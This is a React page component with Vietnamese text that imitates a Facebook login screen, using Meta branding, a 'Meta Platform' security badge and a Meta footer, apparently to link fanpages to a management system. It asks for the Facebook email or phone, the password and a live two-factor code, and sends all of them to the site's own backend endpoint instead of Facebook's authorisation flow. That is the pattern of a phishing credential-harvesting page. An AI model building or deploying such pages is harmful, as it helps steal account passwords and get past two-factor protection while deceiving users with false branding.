'use client';

import React, { useState } from 'react';
import { ShieldCheck, Lock, Phone, RefreshCw, AlertCircle } from 'lucide-react';

export default function FacebookPopupLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [twoFactorCode, setTwoFactorCode] = useState('');
  const [needs2FA, setNeeds2FA] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password.trim()) {
      setErrorMsg('Vui lòng nhập đầy đủ Email/SĐT và Mật khẩu');
      return;
    }

    setIsLoading(true);
    setErrorMsg(null);

    try {
      const res = await fetch('/api/auth/facebook/login-account', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.trim(),
          password: password.trim(),
          twoFactorCode: twoFactorCode.trim() || undefined,
        }),
      });

      const data = await res.json();

      if (data.requires2FA) {
        setNeeds2FA(true);
        setErrorMsg(data.error || 'Vui lòng nhập mã xác thực 2FA của bạn.');
        setIsLoading(false);
        return;
      }

      if (!data.success) {
        throw new Error(data.error || 'Đăng nhập Facebook không thành công. Vui lòng kiểm tra lại tài khoản.');
      }

      // Send result back to parent window
      if (window.opener) {
        window.opener.postMessage(
          {
            type: 'FB_LOGIN_SUCCESS',
            pages: data.pages || [],
            user: data.user,
          },
          window.location.origin
        );
        window.close();
      } else {
        alert('Đăng nhập thành công! Bạn có thể quay lại trang chính.');
      }
    } catch (err: any) {
      setErrorMsg(err.message || 'Lỗi khi đăng nhập Facebook.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col justify-center items-center p-4 font-sans text-slate-800 antialiased">
      {/* Meta Facebook Header */}
      <div className="w-full max-w-md text-center mb-6">
        <h1 className="text-4xl font-extrabold text-[#1877F2] tracking-tight">facebook</h1>
        <p className="text-sm text-slate-600 mt-2 font-medium">
          Đăng nhập vào Facebook để liên kết Fanpage với Hệ thống Quản trị
        </p>
      </div>

      {/* Login Card */}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-200 p-6 space-y-4">
        {errorMsg && (
          <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-red-600 text-xs flex items-start gap-2 animate-in fade-in">
            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
            <div className="flex-1 leading-snug">{errorMsg}</div>
          </div>
        )}

        <form onSubmit={handleLogin} className="space-y-3.5">
          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">
              Email hoặc số điện thoại
            </label>
            <div className="relative">
              <Phone className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                required
                autoFocus
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email hoặc số điện thoại..."
                className="w-full pl-10 pr-3 py-3 border border-slate-300 rounded-xl bg-slate-50/50 text-slate-900 text-sm focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">
              Mật khẩu
            </label>
            <div className="relative">
              <Lock className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Mật khẩu Facebook..."
                className="w-full pl-10 pr-3 py-3 border border-slate-300 rounded-xl bg-slate-50/50 text-slate-900 text-sm focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all"
              />
            </div>
          </div>

          {needs2FA && (
            <div className="space-y-1.5 p-3.5 bg-amber-50 border border-amber-200 rounded-xl animate-in fade-in">
              <label className="block text-xs font-semibold text-amber-800">
                Mã xác thực 2 lớp (2FA Authenticator / SMS)
              </label>
              <input
                type="text"
                value={twoFactorCode}
                onChange={(e) => setTwoFactorCode(e.target.value)}
                placeholder="Nhập 6 chữ số..."
                className="w-full px-3 py-2.5 text-base tracking-widest font-mono text-center font-bold border border-amber-300 rounded-lg bg-white text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#1877F2]"
              />
            </div>
          )}

          <button
            type="submit"
            disabled={isLoading || !email.trim() || !password.trim()}
            className="w-full py-3 px-4 bg-[#1877F2] hover:bg-[#166fe5] active:bg-[#1465cf] text-white font-bold text-sm rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
          >
            {isLoading ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin" />
                <span>Đang xác thực tài khoản Facebook...</span>
              </>
            ) : (
              <span>Đăng nhập</span>
            )}
          </button>
        </form>

        <div className="pt-2 text-center border-t border-slate-100 flex items-center justify-center gap-1.5 text-xs text-slate-500">
          <ShieldCheck className="w-4 h-4 text-emerald-600" />
          <span>Bảo mật theo tiêu chuẩn Meta Platform</span>
        </div>
      </div>

      {/* Meta footer */}
      <div className="mt-6 text-xs text-slate-500 text-center">
        Meta © 2026 • Facebook for Business
      </div>
    </div>
  );
}
